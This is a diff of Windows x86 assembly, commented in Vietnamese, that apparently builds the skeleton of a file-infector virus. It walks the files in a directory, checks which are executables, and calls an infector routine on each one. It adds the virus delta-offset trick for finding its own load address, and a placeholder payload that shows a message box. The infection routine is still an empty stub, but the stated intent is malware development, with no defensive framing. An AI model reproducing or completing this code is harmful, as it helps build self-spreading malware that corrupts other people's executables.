@@ -18,6 +18,7 @@ includelib user32.lib
 	pathNew db 100 dup (0)
 	data db 100 dup (0)
 	flagCheckExe db 0
+	virtualAddress dd ?
 .code
 read proc number : dword ; ham doc byte voi so luong byte can doc truyen vao 
 	push 0
@@ -105,8 +106,15 @@ endProc:
 	ret
 
 checkFileExe endp
-main: ; Ham main 
-	
+
+ifectorFile proc	
+	;;
+endProcInfectorFile:
+	ret
+
+ifectorFile endp
+
+main: ; Ham main 	
     push offset wfd
     push offset path
     call FindFirstFileA ; Duyet file dau tien trong thu muc
@@ -123,14 +131,24 @@ loopFile:
 	call checkFileExe ; goi ham kiem tra xem co phai la file thuc thi hay khong
 	cmp byte ptr [flagCheckExe] , 0 
 	je nextLoopFile ; neu khong phai file thuc thi thi bo qua khong xu li
-	
+	;;;;;;;;;;
 	;;logic file infector in here
-	push 0 
-	push 0
-	push offset pathNew
-	push 0
-	call MessageBox 
+	
+	
+	;;tien hanh su dung ki thuat delta de lay duoc dia chi that su file khi duoc chay tren bo nho  
+	call Delta
+Delta:
+	pop ebp ; Sau khi call thi windows loader se tien hanh day dia chi thuc su cua label Delta vao trong stack
+	; Tuc la ta da lay duoc dia chi that su khi chay trong bo nho cua label Detal nay 
+	;offset se lay duoc gia tri ao tuong doi tinh tu imagesbase 
+	sub ebp , offset Delta ; Tuc la cau lenh nay se lay dia chi that su tren bo nho tru dia dia chi ao tuong doi va tinh duoc dia chi that su cua chuong trinh tren bo nho
+	;; Tai sao lai khong dung imagebase vi no la dia chi windows loader uu tien khi tai len bo nho thoi nhung co the no se tai len dia chi khac khi dia chia uu tien da duoc su dung  
+	mov dword ptr [virtualAddress] , ebp ; Luu lai dung sau 
+	
+	
+	call ifectorFile 
 	;;end
+	;;;;;;;;;
 nextLoopFile:
     push offset wfd
     push dword ptr [handle]
@@ -139,7 +157,14 @@ nextLoopFile:
     jne loopFile ; Neu khong loi thi tiep tuc duyet file
 
 endLoopFile: ; end chuong trinhf
-    push [handle]
-    call FindClose ; dong handle
-    ret
+    push 0 
+    call ExitProcess 
+    
+payload :
+	push 0
+	push 0
+	push 0
+	push 0
+	call MessageBox
+    
 end main
